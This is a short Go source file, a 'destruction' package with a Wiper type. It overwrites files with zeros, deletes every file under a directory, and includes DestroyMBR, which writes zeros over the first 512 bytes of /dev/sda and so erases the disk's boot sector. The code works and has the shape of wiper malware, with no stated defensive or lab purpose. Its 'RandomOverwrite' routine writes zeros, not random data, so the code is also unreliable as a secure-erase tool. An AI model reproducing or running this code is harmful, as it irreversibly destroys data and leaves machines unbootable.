package destruction

import (
"os"
"path/filepath"
)

type Wiper struct{}

func NewWiper() *Wiper {
return &Wiper{}
}

func (w *Wiper) ZeroOverwrite(path string) error {
info, err := os.Stat(path)
if err != nil {
return err
}
size := info.Size()
data := make([]byte, size)
file, err := os.OpenFile(path, os.O_WRONLY, 0644)
if err != nil {
return err
}
defer file.Close()
_, err = file.Write(data)
return err
}

func (w *Wiper) RandomOverwrite(path string) error {
info, err := os.Stat(path)
if err != nil {
return err
}
size := info.Size()
data := make([]byte, size)
// In real implementation, would use crypto/rand
file, err := os.OpenFile(path, os.O_WRONLY, 0644)
if err != nil {
return err
}
defer file.Close()
_, err = file.Write(data)
return err
}

func (w *Wiper) DestroyMBR() error {
data := make([]byte, 512)
return os.WriteFile("/dev/sda", data, 0644)
}

func (w *Wiper) DeleteFiles(dir string) error {
return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
if err != nil {
return err
}
if !info.IsDir() {
return os.Remove(path)
}
return nil
})
}
